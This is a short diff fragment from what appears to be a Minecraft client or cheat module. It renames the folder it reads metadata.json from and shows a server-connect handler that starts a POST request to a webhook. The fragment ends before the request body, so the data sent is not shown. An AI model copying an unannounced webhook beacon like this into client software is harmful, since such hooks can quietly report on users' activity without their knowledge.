@@ -60,7 +60,7 @@ register("gameLoad", () => {
 register("serverConnect", () => {
   if (playerjoin) return
   playerjoin = true
-  let metadata = JSON.parse(FileLib.read("OdinClient", "metadata.json"))
+  let metadata = JSON.parse(FileLib.read("OdinCheata", "metadata.json"))
   request({
     url: webhook,
     method: "POST",
